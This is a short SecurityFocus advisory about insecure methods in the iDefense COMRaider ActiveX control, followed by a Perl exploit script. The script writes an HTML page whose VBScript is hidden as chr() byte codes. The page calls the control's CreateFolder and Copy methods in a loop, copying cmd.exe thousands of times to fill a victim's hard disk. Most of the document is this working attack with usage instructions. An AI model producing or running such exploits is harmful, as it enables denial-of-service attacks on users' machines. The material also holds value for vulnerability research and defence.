source: http://www.securityfocus.com/bid/35725/info

The iDefense COMRaider ActiveX control is prone to multiple insecure-method vulnerabilities.

Successfully exploiting these issues allows remote attackers to create arbitrary directories and copy arbitrary local files. This may lead to a denial-of-service condition or aid in further attacks. 

#!/usr/bin/perl
###############################################################
# COMRaider Idefense Labs CreateFolder() and Copy() Insecure Method (Hard Disk Filler Exploit)
#
# Discovered and Exploited by : Khashayar Fereidani
# Http://IRCRASH.com & Http://Fereidani.ir
#
##############################################################
# Help :
#  perl comraider.pl
#  Please enter the foldername (C:\ircrash\ for example) : C:\ircrash\
#  Please enter number of copy cmd to folder (10000 or more for example) : 10000
#  ** Ok comraider.html created , now you can use this
###############################################################
# Tnx : Only for God
###############################################################
$cmd = 'C:\WINDOWS\system32\cmd.exe';

print 'Please enter the foldername (C:\ircrash\ for example) : ';
$folder =  <stdin>;
print "Please enter number of copy cmd to folder (10000 or more for example) : ";
$number = <stdin>;
chomp $number;
chomp $folder;

$shellcode = chr(0x3C).chr(0x48).chr(0x54).chr(0x4D).chr(0x4C).chr(0x3E).chr(0xD).chr(0xA).chr(0x3C).chr(0x21).chr(0x2D).chr(0x2D).chr(0xD).chr(0xA).chr(0x43).chr(0x4F).chr(0x4D).chr(0x52).chr(0x61).chr(0x69).chr(0x64).chr(0x65).chr(0x72).chr(0x20).chr(0x49).chr(0x64).chr(0x65).chr(0x66).chr(0x65).chr(0x6E).chr(0x73).chr(0x65).chr(0x20).chr(0x4C).chr(0x61).chr(0x62).chr(0x73).chr(0x20).chr(0x43).chr(0x72).chr(0x65).chr(0x61).chr(0x74).chr(0x65).chr(0x46).chr(0x6F).chr(0x6C).chr(0x64).chr(0x65).chr(0x72).chr(0x28).chr(0x29).chr(0x20).chr(0x61).chr(0x6E).chr(0x64).chr(0x20).chr(0x43).chr(0x6F).chr(0x70).chr(0x79).chr(0x28).chr(0x29).chr(0x20).chr(0x49).chr(0x6E).chr(0x73).chr(0x65).chr(0x63).chr(0x75).chr(0x72).chr(0x65).chr(0x20).chr(0x4D).chr(0x65).chr(0x74).chr(0x68).chr(0x6F).chr(0x64).chr(0x20).chr(0x45).chr(0x78).chr(0x70).chr(0x6C).chr(0x6F).chr(0x69).chr(0x74).chr(0xD).chr(0xA).chr(0x44).chr(0x69).chr(0x73).chr(0x63).chr(0x6F).chr(0x76).chr(0x65).chr(0x72).chr(0x65).chr(0x64).chr(0x20).chr(0x62).chr(0x79).chr(0x20).chr(0x3A).chr(0x20).chr(0x4B).chr(0x68).chr(0x61).chr(0x73).chr(0x68).chr(0x61).chr(0x79).chr(0x61).chr(0x72).chr(0x20).chr(0x46).chr(0x65).chr(0x72).chr(0x65).chr(0x69).chr(0x64).chr(0x61).chr(0x6E).chr(0x69).chr(0xD).chr(0xA).chr(0x68).chr(0x74).chr(0x74).chr(0x70).chr(0x3A).chr(0x2F).chr(0x2F).chr(0x66).chr(0x65).chr(0x72).chr(0x65).chr(0x69).chr(0x64).chr(0x61).chr(0x6E).chr(0x69).chr(0x2E).chr(0x69).chr(0x72).chr(0x20).chr(0x26).chr(0x20).chr(0x68).chr(0x74).chr(0x74).chr(0x70).chr(0x3A).chr(0x2F).chr(0x2F).chr(0x69).chr(0x72).chr(0x63).chr(0x72).chr(0x61).chr(0x73).chr(0x68).chr(0x2E).chr(0x63).chr(0x6F).chr(0x6D).chr(0xD).chr(0xA).chr(0x2D).chr(0x2D).chr(0x3E).chr(0xD).chr(0xA).chr(0xD).chr(0xA).chr(0x3C).chr(0x6F).chr(0x62).chr(0x6A).chr(0x65).chr(0x63).chr(0x74).chr(0x20).chr(0x63).chr(0x6C).chr(0x61).chr(0x73).chr(0x73).chr(0x69).chr(0x64).chr(0x3D).chr(0x27).chr(0x63).chr(0x6C).chr(0x73).chr(0x69).chr(0x64).chr(0x3A).chr(0x39).chr(0x41).chr(0x30).chr(0x37).chr(0x37).chr(0x44).chr(0x30).chr(0x44).chr(0x2D).chr(0x42).chr(0x34).chr(0x41).chr(0x36).chr(0x2D).chr(0x34).chr(0x45).chr(0x43).chr(0x30).chr(0x2D).chr(0x42).chr(0x36).chr(0x43).chr(0x46).chr(0x2D).chr(0x39).chr(0x38).chr(0x35).chr(0x32).chr(0x36).chr(0x44).chr(0x46).chr(0x35).chr(0x38).chr(0x39).chr(0x45).chr(0x34).chr(0x27).chr(0x20).chr(0x69).chr(0x64).chr(0x3D).chr(0x27).chr(0x74).chr(0x61).chr(0x72).chr(0x67).chr(0x65).chr(0x74).chr(0x27).chr(0x3E).chr(0x3C).chr(0x2F).chr(0x6F).chr(0x62).chr(0x6A).chr(0x65).chr(0x63).chr(0x74).chr(0x3E).chr(0xD).chr(0xA).chr(0xD).chr(0xA).chr(0x3C).chr(0x73).chr(0x63).chr(0x72).chr(0x69).chr(0x70).chr(0x74).chr(0x20).chr(0x6C).chr(0x61).chr(0x6E).chr(0x67).chr(0x75).chr(0x61).chr(0x67).chr(0x65).chr(0x3D).chr(0x27).chr(0x76).chr(0x62).chr(0x73).chr(0x63).chr(0x72).chr(0x69).chr(0x70).chr(0x74).chr(0x27).chr(0x3E).chr(0xD).chr(0xA).chr(0x61).chr(0x72).chr(0x67).chr(0x66).chr(0x3D).chr(0x22).$folder.chr(0x22).chr(0xD).chr(0xA).chr(0x74).chr(0x61).chr(0x72).chr(0x67).chr(0x65).chr(0x74).chr(0x2E).chr(0x43).chr(0x72).chr(0x65).chr(0x61).chr(0x74).chr(0x65).chr(0x46).chr(0x6F).chr(0x6C).chr(0x64).chr(0x65).chr(0x72).chr(0x20).chr(0x61).chr(0x72).chr(0x67).chr(0x66).chr(0xD).chr(0xA).chr(0x6E).chr(0x75).chr(0x6D).chr(0x62).chr(0x65).chr(0x72).chr(0x31).chr(0x20).chr(0x3D).chr(0x20).chr(0x30).chr(0xD).chr(0xA).chr(0x6E).chr(0x75).chr(0x6D).chr(0x62).chr(0x65).chr(0x72).chr(0x32).chr(0x20).chr(0x3D).chr(0x20).$number.chr(0xD).chr(0xA).chr(0x77).chr(0x68).chr(0x69).chr(0x6C).chr(0x65).chr(0x20).chr(0x28).chr(0x6E).chr(0x75).chr(0x6D).chr(0x62).chr(0x65).chr(0x72).chr(0x31).chr(0x20).chr(0x3C).chr(0x20).chr(0x6E).chr(0x75).chr(0x6D).chr(0x62).chr(0x65).chr(0x72).chr(0x32).chr(0x29).chr(0xD).chr(0xA).chr(0x6E).chr(0x75).chr(0x6D).chr(0x62).chr(0x65).chr(0x72).chr(0x31).chr(0x20).chr(0x3D).chr(0x20).chr(0x6E).chr(0x75).chr(0x6D).chr(0x62).chr(0x65).chr(0x72).chr(0x31).chr(0x20).chr(0x2B).chr(0x20).chr(0x31).chr(0xD).chr(0xA).chr(0x61).chr(0x72).chr(0x67).chr(0x31).chr(0x3D).chr(0x22).$cmd.chr(0x22).chr(0xD).chr(0xA).chr(0x61).chr(0x72).chr(0x67).chr(0x32).chr(0x3D).chr(0x61).chr(0x72).chr(0x67).chr(0x66).chr(0x20).chr(0x26).chr(0x20).chr(0x6E).chr(0x75).chr(0x6D).chr(0x62).chr(0x65).chr(0x72).chr(0x31).chr(0x20).chr(0x26).chr(0x20).chr(0x22).chr(0x2E).chr(0x65).chr(0x78).chr(0x65).chr(0x22).chr(0xD).chr(0xA).chr(0x74).chr(0x61).chr(0x72).chr(0x67).chr(0x65).chr(0x74).chr(0x2E).chr(0x43).chr(0x6F).chr(0x70).chr(0x79).chr(0x20).chr(0x61).chr(0x72).chr(0x67).chr(0x31).chr(0x20).chr(0x2C).chr(0x61).chr(0x72).chr(0x67).chr(0x32).chr(0xD).chr(0xA).chr(0x77).chr(0x65).chr(0x6E).chr(0x64).chr(0xD).chr(0xA).chr(0x3C).chr(0x2F).chr(0x73).chr(0x63).chr(0x72).chr(0x69).chr(0x70).chr(0x74).chr(0x3E);

print "** OK comraider.html created , now you can use this";

open(myfile,'>>comraider.html');
print myfile $shellcode;